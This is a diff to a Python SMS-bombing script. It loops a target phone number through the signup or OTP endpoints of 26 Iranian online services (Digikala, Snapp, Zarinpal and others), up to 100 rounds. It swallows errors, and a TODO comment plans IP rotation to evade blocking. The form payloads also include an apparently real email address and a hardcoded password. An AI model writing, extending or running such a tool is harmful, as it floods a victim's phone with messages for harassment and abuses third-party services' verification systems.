@@ -8,8 +8,9 @@ from fake_useragent import UserAgent
 range_n_limit = 100
 
 services = ['pakhsh', 'lendo', 'banimode', 'snappmarket', 'snapp', 'sheypoor', 'digikala', 'itoll',
-             'tapsi', 'sibche', 'zarinpal', 'snappbox', 'snappfood', 'safaremoon', 'saapa', 'okala',
-               'timcheh', 'honari', 'mydigipay', 'ketabchi', 'komodaa', 'taaghche', 'azki', 'drdr', 'esam']  # 24 online service
+            'tapsi', 'sibche', 'zarinpal', 'snappbox', 'snappfood', 'safaremoon', 'saapa', 'okala',
+            'timcheh', 'honari', 'mydigipay', 'ketabchi', 'komodaa', 'taaghche', 'azki', 'drdr',
+            'esam', 'iranjahanpoosh', 'carrel' ]  # 26 online service
 
 def validate_phone_number(phone_number):
     pattern = r"^09\d{9}$"  
@@ -446,7 +447,7 @@ def send(phone_number, r):  #TODO: add prvity Change IP
             'first_name': 'adad',
             'last_name': 'adad',
             'user_login': 'dadadadad',
-            'phone_number': '09050756226',
+            'phone_number': f'{p}',
             'user_email': 'emamidadmehr@gmail.com',
             'password': '6vNWkDCX4LVnSMD',
             'password_repeat': '6vNWkDCX4LVnSMD',
@@ -462,31 +463,55 @@ def send(phone_number, r):  #TODO: add prvity Change IP
 
     # RUN
     print("Service   Status")
-    for rn in range(r):
-        try:
-            pakhsh(p=phone_number)
-            lendo(p=phone_number)
-            banimode(p=phone_number)
-            snappmarket(p=phone_number)
-            snapp(p=phone_number)
-            sheypoor(p=phone_number)
-            digikala(p=phone_number)
-            itoll(p=phone_number)
-            tapsi(p=phone_number)
-            sibche(p=phone_number)
-            zarinpal(p=phone_number)
-            snappbox(p=phone_number)
-            safaremoon(p=phone_number)
-            saapa(p=phone_number)
-            okala(p=phone_number)
-            timcheh(p=phone_number)
-            honari(p=phone_number)
-            mydigipay(p=phone_number)
-            ketabchi(p=phone_number)
-            komodaa(p=phone_number)
-            taaghche(p=phone_number)
-            azki(p=phone_number)
-            drdr(p=phone_number)
-            esam(p=phone_number)
-        except:
-            pass
+    if r < range_n_limit or r == range_n_limit:
+        for rn in range(r):
+            try:
+                pakhsh(p=phone_number)
+                lendo(p=phone_number)
+                banimode(p=phone_number)
+                snappmarket(p=phone_number)
+                snapp(p=phone_number)
+            except:
+                pass
+
+            try:
+                sheypoor(p=phone_number)
+                digikala(p=phone_number)
+                itoll(p=phone_number)
+                tapsi(p=phone_number)
+                sibche(p=phone_number)
+            except:
+                pass
+
+            try:
+                zarinpal(p=phone_number)
+                snappbox(p=phone_number)
+                safaremoon(p=phone_number)
+                saapa(p=phone_number)
+                okala(p=phone_number)
+            except:
+                pass
+
+            try:
+                timcheh(p=phone_number)
+                honari(p=phone_number)
+                mydigipay(p=phone_number)
+                ketabchi(p=phone_number)
+                komodaa(p=phone_number)
+            except:
+                pass
+
+            try:
+                taaghche(p=phone_number)
+                azki(p=phone_number)
+                drdr(p=phone_number)
+                esam(p=phone_number)
+                iranjahanpoosh(p=phone_number)
+            except:
+                pass
+            try:
+                carrel(p=phone_number)
+            except:
+                pass
+    else:
+        return "Range limit 100"
